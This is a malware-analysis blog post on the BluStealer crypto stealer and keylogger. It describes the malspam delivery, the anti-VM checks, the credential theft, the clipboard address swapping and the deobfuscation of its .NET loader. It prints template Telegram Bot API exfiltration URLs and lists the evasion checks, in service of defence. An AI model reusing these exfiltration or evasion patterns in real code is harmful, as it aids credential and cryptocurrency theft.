<h2 class="wp-block-heading">Overview</h2>



<p><strong><span style="color:#07a300" class="has-inline-color">BluStealer</span></strong> is is a crypto stealer, keylogger, and document uploader written in Visual Basic that loads C#.NET hack tools to steal credentials. The family was first mentioned by <a href="https://twitter.com/James_inthe_box/status/1395824249605025792" target="_blank" rel="noreferrer noopener">@James_inthe_box</a> in May and referred to as <a href="https://twitter.com/search?q=%23A310Logger&amp;lang=en" target="_blank" rel="noreferrer noopener">a310logger</a>. In fact, <span style="color:#07a300" class="has-inline-color">a310logger</span> is just one of the namespaces within the .NET component that appeared in the string artifacts. Around July, <a href="https://www.fortinet.com/blog/threat-research/fresh-malware-hunts-for-crypto-wallet-and-credentials" target="_blank" rel="noreferrer noopener">Fortinet</a> referred to the same family as a &#8220;fresh malware&#8221;, and recently it is mentioned again as BluStealer by <a href="https://twitter.com/GoSecure_Inc/status/1437435265350397957?s=20" target="_blank" rel="noreferrer noopener">GoSecure</a>. In this blog, we decide to go with the BluStealer naming while providing a fuller view of the family along with details of its inner workings.</p>

<p>BluStealer is primarily spread through malspam campaigns. A large number of the samples we found come from a particular campaign that is recognizable through the use of a unique .NET loader. The analysis of this loader is provided in this <a href="https://decoded.avast.io/anhho/blustealer#walkthrough">section</a>. Below are two BluStealer malspam samples. The first is a fake DHL invoice in English. The second is a fake General de Perfiles message, a Mexican metal company, in Spanish. Both samples contain .iso attachments and download URLs that the messages claim is a form that the lure claims the recipient needs to open and fill out to resolve a problem. The attachments contain the malware executables packed with the mentioned .NET Loader.</p>

<h2 class="wp-block-heading">BluStealer Analysis</h2>



<p>As mentioned, BluStealer consists of a core written in Visual Basic and the C# .NET inner payload(s). Both components vary greatly among the samples indicating the malware builder’s ability to customize each component separately. The VB core reuses a large amount of code from a 2004 <a href="http://www.a1vbcode.com/app-2530.asp" target="_blank" rel="noreferrer noopener">SpyEx</a> project, hence the inclusion of <span style="color:#07a300" class="has-inline-color">“SpyEx”</span> strings in early samples from May. However, the malware authors have added the capabilities to steal crypto wallet data, swap crypto addresses present in the clipboard, find and upload document files, exfiltrate data through SMTP and the Telegram Bot API, as well as anti-analysis/anti-VM tactics. On the other hand, the .NET component is primarily a credential stealer that is patched together from a combination of open-source C# hack tools such as <a href="https://github.com/V1V1/SharpScribbles" target="_blank" rel="noreferrer noopener">ThunderFox</a>, <a href="https://github.com/Elysian01/Chrome-Recovery" target="_blank" rel="noreferrer noopener">ChromeRecovery</a>, <a href="https://github.com/swagkarna/StormKitty" target="_blank" rel="noreferrer noopener">StormKitty</a>, and <a href="https://github.com/lclevy/firepwd" target="_blank" rel="noreferrer noopener">firepwd</a>. Note that not all the mentioned features are available in a single sample.</p>

<h3 class="wp-block-heading"><strong>Anti-VM Tactics</strong></h3>



<p>BluStealer checks the following conditions:</p>



<p>If property <strong><span style="color:#07a300" class="has-inline-color">Model</span></strong> of&nbsp; <strong><span style="color:#07a300" class="has-inline-color">Win32_ComputerSystem</span></strong> WMI class contains:</p>



<p><span style="color:#07a300" class="has-inline-color">VIRTUA</span> (without L), <span style="color:#07a300" class="has-inline-color">VMware Virtual Platform</span>,  <span style="color:#07a300" class="has-inline-color">VirtualBox</span>,  <span style="color:#07a300" class="has-inline-color">microsoft corporation</span>,  <span style="color:#07a300" class="has-inline-color">vmware</span>, <span style="color:#07a300" class="has-inline-color">VMware</span>, <span style="color:#07a300" class="has-inline-color">vmw</span></p>



<p>If property<strong> </strong><span style="color:#07a300" class="has-inline-color"><strong>SerialNumber</strong> </span>of<strong> <span style="color:#07a300" class="has-inline-color">Win32_BaseBoard</span></strong> WMI class contains&nbsp; <span style="color:#07a300" class="has-inline-color">0</span> or <span style="color:#07a300" class="has-inline-color">None</span></p>



<p>If the following files exist:</p>



<ul class="wp-block-list"><li>C:\\Windows\\System32\\drivers\\vmhgfs.sys</li></ul>



<ul class="wp-block-list"><li>C:\\Windows\\System32\\drivers\\vmmemctl.sys</li></ul>



<ul class="wp-block-list"><li>C:\\Windows\\System32\\drivers\\vmmouse.sys</li></ul>



<ul class="wp-block-list"><li>C:\\Windows\\System32\\drivers\\vmrawdsk.sys</li></ul>



<ul class="wp-block-list"><li>C:\\Windows\\System32\\drivers\\VBoxGuest\.sys</li></ul>



<ul class="wp-block-list"><li>C:\\Windows\\System32\\drivers\\VBoxMouse.sys</li></ul>



<ul class="wp-block-list"><li>C:\\Windows\\System32\\drivers\\VBoxSF.sys</li></ul>



<ul class="wp-block-list"><li>C:\\Windows\\System32\\drivers\\VBoxVideo.sys</li></ul>



<p>If any of these conditions are satisfied, BluStealer will stop executing.</p>



<h3 class="wp-block-heading">.NET Component</h3>



<p>The BluStealer retrieves the .NET payload(s) from the resource section and decrypts it with the above WinZip AES algorithm using a hardcoded key. Then it executes one of the following command-line utilities to launch the .NET executable(s):</p>



<ul class="wp-block-list"><li>C:\Windows\Microsoft.NET\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe</li></ul>



<ul class="wp-block-list"><li>C:\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe</li></ul>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="403" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image14-1-1024x403.png" alt="" class="wp-image-4162" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image14-1-1024x403.png 1024w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image14-1-300x118.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image14-1-768x302.png 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image14-1.png 1465w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>Examples of two .NET executables loaded by the VB core. The stolen credentials are written to &#8220;credentials.txt&#8221;</figcaption></figure></div>



<p>The .NET component does not communicate with the VB core in any way. It steals the credentials of popular browsers and applications then writes them to disk at a chosen location with a designated filename (i.e credentials.txt). The VB core will look for this drop and exfiltrate it later on. This mechanic is better explained in the next<strong> </strong><a href="https://decoded.avast.io/anhho/blustealer#Stealer">section</a>. </p>



<p>The .NET component is just a copypasta of open-source C# projects listed below. You can find more information on their respective Github pages:</p>



<ul class="wp-block-list"><li>ThunderFox: github.com/V1V1/SharpScribbles</li><li>ChromeRecovery: github.com/Elysian01/Chrome-Recovery</li><li>StormKitty: github.com/swagkarna/StormKitty</li><li>Firepwd:github.com/lclevy/firepwd&nbsp;</li></ul>



<h3 class="wp-block-heading" id="Stealer">Information Stealer</h3>



<p>Both the VB core and the .NET component write stolen information to the <em>%appdata%\Microsoft\Templates </em>folder. Each type of stolen data is written to a different file with predefined filenames. The VB core sets up different timers to watch over each file and keeps track of their file sizes. When the file size increases, the VB core will send it to the attacker.</p>

<p>BluStealer VB core also detects the crypto addresses copied to the clipboard and replaces them with the attacker’s predefined ones. Collectively it can support the following addresses: Bitcoin, bitcoincash, Ethereum, Monero, Litecoin.</p>



<h3 class="wp-block-heading"><strong>Data Exfiltration</strong></h3>



<p>BluStealer exfiltrates stolen data via SMTP (reusing SpyEx’s code) and Telegram Bot, hence the lack of server-side code. The Telegram token and chat_id are hardcoded to execute the 2 commands: <em>sendDocumen</em>t and <em>sendMessage</em> as shown below</p>



<ul class="wp-block-list"><li>https://api.telegram.org/bot[BOT TOKEN]/sendMessage?chat_id=[MY_CHANNEL_ID]&amp;text=[MY_MESSAGE_TEXT]</li><li>https://api.telegram.org/bot[BOT TOKEN]/sendDocument?chat_id=[MY_CHANNEL_ID]&amp;caption=[MY_CAPTION]</li></ul>



<p>The SMTP traffic is constructed using Microsoft MimeOLE specifications</p>

<h3 class="wp-block-heading">Second stage</h3>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image12.png"><img loading="lazy" decoding="async" width="1024" height="480" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image12-1024x480.png" alt="" class="wp-image-4181" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image12-1024x480.png 1024w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image12-300x141.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image12-768x360.png 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image12.png 1270w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><figcaption>Inside the Data() function of the second stage which has two strange resource files along with their getter functions</figcaption></figure></div>



<p>The second stage has the function calls and strings obfuscated, so the “Analyze” feature may not be as helpful. However, there are two resource files that look out-of-place enough for us to pivot off. Their getter functions can be easily found in the <span style="color:#07a300" class="has-inline-color">Resources</span> class of the <span style="color:#07a300" class="has-inline-color">Properties</span> namespace. Setting the breakpoint on the Ehiuuvbfrnprkuyuxqv getter function 0x17000003 leads us to a function where it is gzip decompressed revealing a PE file.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image5.png"><img loading="lazy" decoding="async" width="949" height="669" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image5.png" alt="" class="wp-image-4182" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image5.png 949w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image5-300x211.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image5-768x541.png 768w" sizes="(max-width: 949px) 100vw, 949px" /></a><figcaption>Ehiuuvbfrnprkuyuxqv is decompressed with gzip</figcaption></figure></div>



<p>On the other hand, the breakpoint on the Ltvddtjmqumxcwmqlzcos getter function 0x17000004 leaves us in the middle of the Data() function, where all the function calls are made by passing a field into CompareComparator function that will invoke it like a method.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image6.png"><img loading="lazy" decoding="async" width="573" height="88" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image6.png" alt="" class="wp-image-4183" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image6.png 573w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image6-300x46.png 300w" sizes="(max-width: 573px) 100vw, 573px" /></a><figcaption>ComareComparator is used to invoke one of the argument</figcaption></figure></div>



<p>In order to understand what is going on, we have to know what functions these fields represent. From the experience working with <a href="https://decoded.avast.io/anhho/masslogger-v3-a-net-stealer-with-serious-obfuscation/" target="_blank" rel="noreferrer noopener">MassLogger</a> in the past, the <strong>field to method</strong> map file is likely embedded in the resource section, which in this case, “Dic.Attr” naming is a strong tell.</p>



<p>Note that it is important to find out where these fields are mapped to, because “Step into” may not get us directly to the designated functions. Some of the mapped functions are modified during the field-method binding process. So when the corresponding fields are invoked, the DynamicResolver.GetCodeInfo() will be called to build the target function at run-time. Even though the function modification only consists of replacing some opcodes with equivalent ones while keeping the content the same, it is sufficient enough to obfuscate function calls during dynamic analysis.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image1.png"><img loading="lazy" decoding="async" width="994" height="564" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image1.png" alt="" class="wp-image-4184" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image1.png 994w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image1-300x170.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image1-768x436.png 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image1-344x194.png 344w" sizes="(max-width: 994px) 100vw, 994px" /></a><figcaption> Dic.Attr is interpreted into a field-method dictionary </figcaption></figure></div>



<p>The search of the <span style="color:#07a300" class="has-inline-color">“Dic.Attr”</span> string leads us to the function where the mapping occurs. The dictionary value represents the method token that will be bound, and the key value is the corresponding field. As for the method tokens start with 0x4A, just replace them with 0x6 to get the correct methods. These are the chosen ones to be modified for obfuscation purposes.</p>



<p>With all the function calls revealed, we can understand what’s going on inside the Data() method. First, it loads a new assembly that is the decompressed Ehiuuvbfrnprkuyuxqv. Then, it tries to create an instance of an object named SmartAssembly.Queues.MapFactoryQueue. To end the mystery, a method called &#8220;RegisterSerializer&#8221; is invoked with the data of the other resource file as an argument. At this point, we can assume that the purpose of this function would be to decrypt the other resource file and execute it.</p>



<p>Heading to the newly loaded module (af43ec8096757291c50b8278631829c8aca13649d15f5c7d36b69274a76efdac), we can see the SmartAssembly watermark and all the obfuscation features labeled as shown below.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image16.png"><img loading="lazy" decoding="async" width="1024" height="411" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image16-1024x411.png" alt="" class="wp-image-4186" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image16-1024x411.png 1024w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image16-300x121.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image16-768x309.png 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image16.png 1441w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><figcaption>Overview of the decompressed  Ehiuuvbfrnprkuyuxqv. Here you can find the method RegisterSerializer locates inside  SmartAssembly.Queues.MapFactoryQueue </figcaption></figure></div>



<p>The unpacking process will not be much different from the previous layer but with the overhead of code virtualization. From static analysis, our RegisterSerializer may look empty but once the SmartAssembly.Queues class is instantiated the method will be loaded properly:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image3.png"><img loading="lazy" decoding="async" width="1024" height="412" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image3-1024x412.png" alt="" class="wp-image-4188" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image3-1024x412.png 1024w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image3-300x121.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image3-768x309.png 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image3.png 1150w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><figcaption>The function content when analyzed statically.</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image13.png"><img loading="lazy" decoding="async" width="588" height="541" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image13.png" alt="" class="wp-image-4189" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image13.png 588w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image13-300x276.png 300w" sizes="(max-width: 588px) 100vw, 588px" /></a><figcaption>The function content after instantiated. Note that argument &#8220;res&#8221; represents the data of the second resource file</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image10.png"><img loading="lazy" decoding="async" width="550" height="79" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image10.png" alt="" class="wp-image-4190" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image10.png 550w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image10-300x43.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image10-540x79.png 540w" sizes="(max-width: 550px) 100vw, 550px" /></a><figcaption>Fast forward to where res is processed inside RegisterSerializer()</figcaption></figure></div>



<p>Lucky for us, the code looks fairly straightforward. The variable “res” holding the encrypted data and is passed to a function that RulesListener.IncludeState represents. Once again, the key still is to find the field token to method token map file which is likely to be located in the resource section. This time searching for the <span style="color:#07a300" class="has-inline-color">GetManifestResourceStream</span> function will help us quickly get to the code section where the map is established:</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image8.png"><img loading="lazy" decoding="async" width="983" height="534" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image8.png" alt="" class="wp-image-4191" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image8.png 983w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image8-300x163.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image8-768x417.png 768w" sizes="(max-width: 983px) 100vw, 983px" /></a><figcaption>The resource file <span style="color:#07a300" class="has-inline-color">Params.Rules</span> is interpreted into a field-method dictionary</figcaption></figure></div>



<p>RulesListener.IncludeState has token <span style="color:#07a300" class="has-inline-color">0x04000220</span> which is mapped to function <span style="color:#07a300" class="has-inline-color">0x60000A3</span>. Inside this function, the decryption algorithm is revealed anticlimactically: reversal and decompression:</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image20.png"><img loading="lazy" decoding="async" width="771" height="108" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image20.png" alt="" class="wp-image-4240" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image20.png 771w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image20-300x42.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image20-768x108.png 768w" sizes="(max-width: 771px) 100vw, 771px" /></a><figcaption>Data from Ltvddtjmqumxcwmqlzcos is reversed</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image18.png"><img loading="lazy" decoding="async" width="895" height="306" src="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image18.png" alt="" class="wp-image-4193" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image18.png 895w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image18-300x103.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2021/09/image18-768x263.png 768w" sizes="(max-width: 895px) 100vw, 895px" /></a><figcaption>Then it is decompressed and executed</figcaption></figure></div>



<p>In fact, <span style="color:#07a300" class="has-inline-color"><strong>all</strong></span> the samples can be unpacked simply by <strong><span style="color:#07a300" class="has-inline-color">decompressing the reversed resource file</span></strong> embedded <strong><span style="color:#07a300" class="has-inline-color">in the second stage</span></strong>. Hopefully, even when this algorithm is changed, my lengthy walkthrough will remain useful at showing you how to defeat the obfuscation tricks.</p>



<h3 class="wp-block-heading">Conclusion</h3>



<p>In this article, we break down BluStealer functionalities and provide some utilities to deobfuscate and extract its IOCs. We also highlight its code reuse of multiple open-source projects. Despite still writing data to disk and without a proper C2 functionality, BluStealer is still a capable stealer. In the second half of the blog, we show how the BluStealer samples and other malware can be obtained from a unique .NET loader. With these insights, we hope that other analysts will have an easier time classifying and analyzing BluStealer.</p>
